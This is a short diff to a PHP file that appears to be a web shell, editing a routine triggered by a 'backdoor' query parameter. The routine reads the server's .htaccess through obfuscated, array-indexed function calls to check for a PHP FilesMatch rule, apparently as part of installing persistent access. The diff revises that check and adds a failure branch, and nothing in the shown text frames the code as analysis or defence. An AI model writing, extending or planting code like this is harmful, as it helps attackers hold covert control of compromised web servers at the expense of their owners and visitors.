@@ -827,9 +827,9 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 
 if ($_GET['backdoor'] == True) {
     // check if htaccess have this code
-    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
-    $cari_code = explode('"', $file_htaccess);
-    if (!$cari_code[1] == '.ph*|Ph*|pH*|PH*') {
+    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/htaccess");
+    $cari_code = explode('<', $file_htaccess);
+    if (!end($cari_code) == '/FilesMatch>') {
         // pengecekan nama file sekarang
         $namafile = $_SERVER['SCRIPT_FILENAME'];
         $fileUtama = explode("/", $namafile);
@@ -849,6 +849,8 @@ if ($_GET['backdoor'] == True) {
         } else {
             echo failed();
         }
+    } else {
+        echo failed();
     }
 }
 
